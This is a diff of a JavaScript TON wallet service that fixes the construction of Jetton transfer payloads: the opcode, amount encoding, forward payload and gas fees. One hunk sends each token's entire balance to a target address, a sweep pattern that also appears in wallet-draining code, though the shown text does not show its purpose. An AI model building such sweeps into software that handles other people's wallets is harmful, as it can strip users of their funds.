@@ -82,38 +82,40 @@ async function getSenderJettonWalletAddress(jettonRoot, ownerAddr) {
 }
 
 /**
- * TIP-3 transfer（通用：包含 USDT 在内的所有 Jetton）
+ * 正确的 Jetton 转账 payload 构建
  */
 async function buildJettonTransferPayloadBase64({
   toOwnerAddress,      // 收款人地址
   rawAmountBigInt,     // 转账数量（BigInt格式）
   responseToAddress,   // 回执地址
-  forwardAmountTon = "0", // 附带的TON数量
+  forwardAmountTon = "0.000000001", // 附带的TON数量，最小值
   forwardComment = "", // 备注，可为空
 }) {
-  const OP_JETTON_TRANSFER = 0x0f8a7ea5; // 32-bit
+  const OP_JETTON_TRANSFER = 0xf8a7ea5; // 正确的操作码
   const cell = new TonWeb.boc.Cell();
 
-  cell.bits.writeUint(OP_JETTON_TRANSFER, 32);
-  cell.bits.writeUint(0, 64); // query_id (使用 0 而不是 0n)
+  // 构建正确的 Jetton 转账消息结构
+  cell.bits.writeUint(OP_JETTON_TRANSFER, 32); // transfer op
+  cell.bits.writeUint(0, 64); // query id
   
-  // 修复：将 BigInt 转换为 BN 对象
+  // 使用 writeCoins 写入 Jetton 数量
   const amountBN = NumberUtils.toBN(rawAmountBigInt);
-  cell.bits.writeUint(amountBN, 128); // amount: uint128
+  cell.bits.writeCoins(amountBN); // transfer amount in nano
   
-  cell.bits.writeAddress(new Address(toOwnerAddress)); // destination (owner)
-  cell.bits.writeAddress(new Address(responseToAddress)); // response_destination
-  cell.bits.writeBit(0); // custom_payload: none
-  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon))); // forward_ton_amount
+  cell.bits.writeAddress(new Address(toOwnerAddress)); // destination address
+  cell.bits.writeAddress(new Address(responseToAddress)); // response address
+  cell.bits.writeBit(0); // no custom payload
+  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon))); // forward ton amount
 
-  // forward_payload:(maybe ^Cell)
+  // forward payload
   if (forwardComment) {
+    cell.bits.writeBit(1); // has forward payload
     const fwd = new TonWeb.boc.Cell();
-    fwd.bits.writeUint(0, 32);
+    fwd.bits.writeUint(0, 32); // text comment prefix
     fwd.bits.writeBytes(Buffer.from(forwardComment, "utf8"));
     cell.refs.push(fwd);
   } else {
-    cell.bits.writeBit(0); // 无 payload
+    cell.bits.writeBit(0); // no forward payload
   }
 
   const boc = await cell.toBoc(false);
@@ -396,14 +398,14 @@ export class WalletService {
             toOwnerAddress: targetOwner,
             rawAmountBigInt: rawBalance,
             responseToAddress: wallet,
-            forwardAmountTon: "0",
-            forwardComment: "",
+            forwardAmountTon: "0.000000001", // 最小 forward amount
+            forwardComment: `Transfer ${j?.jetton?.symbol || 'Jetton'}`,
           });
 
           // 修复：外部消息发送到 senderJettonWallet（发送方的 Jetton 钱包）
           messages.push({
             address: senderJettonWallet.toString(true, true, true), // userFriendly=true, urlSafe=true, testOnly=true
-            amount: this.toNanoStr(0.05), // Gas 费用
+            amount: this.toNanoStr(0.08), // 增加 Gas 费用，确保有足够的 TON 处理转账
             payload,
           });
           
